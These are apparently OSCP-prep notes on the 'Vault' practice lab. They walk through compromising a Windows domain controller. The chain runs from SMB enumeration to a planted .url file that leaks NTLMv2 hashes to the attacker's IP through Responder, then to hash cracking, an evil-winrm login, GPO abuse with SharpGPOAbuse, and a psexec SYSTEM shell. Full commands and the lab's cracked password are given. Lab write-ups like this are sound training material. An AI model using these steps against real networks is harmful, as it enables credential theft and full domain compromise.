This walkthrough for the **Vault** machine from PG-Practice, presented by OffSec's S1REN, covers the process of initial enumeration, NTLMv2 hash capture, and privilege escalation via **Group Policy Object (GPO) Abuse** on a Windows Active Directory domain controller.

The entire process resulted in gaining **NT AUTHORITY\SYSTEM** access.

***

## 📝 Comprehensive OSCP Prep Notes: Vault Walkthrough

### 1. Initial Reconnaissance & Enumeration

| Service | Port | Key Command/Tool | Purpose & Takeaway |
| :--- | :--- | :--- | :--- |
| **Nmap Scan** | All | `nmap -p- -sV -sC $TARGET_IP --open` | Scan all 65,535 ports, probe for service versions (`-sV`), run default scripts (`-sC`), and only report `open` ports to save time (**[[29:41](http://www.youtube.com/watch?v=JocbrhLXuss&t=1781)]**). |
| **RDP** | 3389 | *Connect & Disconnect* | Connecting briefly with `rdesktop` can reveal the **hostname/domain** (`DC\ROOT` and `vault.offsec` in this case), confirming the OS is **Windows 10/Server** (**[[36:50](http://www.youtube.com/watch?v=JocbrhLXuss&t=2210)]**). |
| **LDAP** | 389 | `nmap -sV --script "ldap-*" and not brute $TARGET_IP` | Use Nmap scripts, but explicitly use `and not brute` to avoid time-consuming brute-force attacks and focus on simple enumeration (**[[41:00](http://www.youtube.com/watch?v=JocbrhLXuss&t=2460)]**). |
| **SMB** | 139, 445 | `smbclient -L //$TARGET_IP` | Standard tool to quickly list available shares, which led to the discovery of the **DocumentsShare** (**[[46:25](http://www.youtube.com/watch?v=JocbrhLXuss&t=2785)]**). |
| **SMB Access** | 139, 445 | `smbclient //$TARGET_IP/DocumentsShare` | Successfully connected to the `DocumentsShare` using a **null session** (no password/user) with the `-N` flag (implied) (**[[50:20](http://www.youtube.com/watch?v=JocbrhLXuss&t=3020)]**). |

***

### 2. Gaining a Foothold: NTLMv2 Hash Capture

The goal in the accessible `DocumentsShare` was to force the DC to authenticate to the attacker, capturing an **NTLMv2 hash**.

| Step | Command/Content | Takeaway |
| :--- | :--- | :--- |
| **Start Responder** | `responder -I tun0 -v` | Responder is used to poison network traffic and capture hashes when a target attempts to access an attacker-controlled resource (**[[52:24](http://www.youtube.com/watch?v=JocbrhLXuss&t=3144)]**). |
| **Create Malicious File** | **File:** `offsec.url` | The `.url` shortcut file forces the Windows host to request an icon from the attacker's IP, which is a key technique for **NTLMv2 hash leakage** (**[[54:04](http://www.youtube.com/watch?v=JocbrhLXuss&t=3244)]**). |
| **`offsec.url` Content** | ```ini[InternetShortcut]URL=anythingWorkingDir=anythingIconFile=\\$ATTACKING_IP\%username%.iconIconIndex=1``` | The `%username%` environment variable in the path ensures the current user's name is sent along with the hash (**[[54:48](http://www.youtube.com/watch?v=JocbrhLXuss&t=3288)]**). |
| **Upload File** | `put offsec.url` | Use the `put` command within the `smbclient` session to upload the malicious file (**[[55:46](http://www.youtube.com/watch?v=JocbrhLXuss&t=3346)]**). |
| **Crack Hash** | `john --wordlist=/usr/share/wordlists/rockyou.txt hashes` | **John the Ripper** successfully cracked the captured NTLMv2 hash, yielding the credentials for user **Annie.Rood** and the password **Secure!HM** (**[[58:01](http://www.youtube.com/watch?v=JocbrhLXuss&t=3481)]**). |

***

### 3. Privilege Escalation: GPO Abuse

The cracked credentials were used to gain an initial shell, followed by a local and domain privilege escalation using a **GPO misconfiguration**.

| Step | Command/Tool | Purpose & Takeaway |
| :--- | :--- | :--- |
| **Initial Shell** | `evil-winrm -i $TARGET_IP -u Annie.Rood -p Secure!HM` | Use **Evil-WinRM** for a stable, interactive Powershell session on port 5985 (**[[59:35](http://www.youtube.com/watch?v=JocbrhLXuss&t=3575)]**). |
| **Confirm Permissions** | `whoami /priv` | Confirms the current user's privileges, though nothing immediately exploitable was found (**[[01:01:46](http://www.youtube.com/watch?v=JocbrhLXuss&t=3706)]**). |
| **Load PowerView** | `.\powerview.ps1` | PowerView is a Powershell script for enumerating Windows domain networks. It was transferred to the target using a simple Python HTTP server and `curl` (**[[01:03:57](http://www.youtube.com/watch?v=JocbrhLXuss&t=3837)]**). |
| **Find GPO Rights** | `Get-GPPPermission -Guid {GUID} -TargetType User -TargetName Annie.Rood` | This command was used after enumerating the GUID for the **"Default Domain Policy"** (**[[01:05:42](http://www.youtube.com/watch?v=JocbrhLXuss&t=3942)]**). It revealed that **Annie.Rood** has **GPO Edit/Delete/Modify** rights (**[[01:08:32](http://www.youtube.com/watch?v=JocbrhLXuss&t=4112)]**). |
| **GPO Abuse** | `.\SharpGPOAbuse.exe --add-local-admin --user-account Annie.Rood --gpo-name "Default Domain Policy"` | The **SharpGPOAbuse** binary (transferred to the target) was used to leverage the user's GPO edit rights to add **Annie.Rood** to the local **Administrators** group (**[[01:15:15](http://www.youtube.com/watch?v=JocbrhLXuss&t=4515)]**). |
| **Force Update** | `gpupdate /force` | Windows systems require a **Group Policy Update** to apply changes. This command forces the update, confirming the privilege escalation action (**[[01:16:47](http://www.youtube.com/watch?v=JocbrhLXuss&t=4607)]**). |
| **Final SYSTEM Shell** | `psexec.py vault.offsec/Annie.Rood:'Secure!HM'@$TARGET_IP` | **PSExec.py** (from the Impacket suite) was used with the newly elevated credentials to achieve a final shell as **NT AUTHORITY\SYSTEM** (**[[01:19:49](http://www.youtube.com/watch?v=JocbrhLXuss&t=4789)]**). |

***

### ⚡ Key Commands Summary

| Phase | Description | Command |
| :--- | :--- | :--- |
| **Enumeration** | List SMB Shares | `smbclient -L //$TARGET_IP` |
| **Foothold** | Start Hash Capture | `responder -I tun0 -v` |
| **Foothold** | Crack Hash (Example) | `john --wordlist=/usr/share/wordlists/rockyou.txt hashes` |
| **Foothold** | Get Initial Shell (WinRM) | `evil-winrm -i $TARGET_IP -u Annie.Rood -p Secure!HM` |
| **PE** | Force GPO Update | `gpupdate /force` |
| **Final PE** | Get NT AUTHORITY\SYSTEM Shell (PSExec) | `psexec.py vault.offsec/Annie.Rood:'Secure!HM'@$TARGET_IP` |
http://googleusercontent.com/youtube_content/0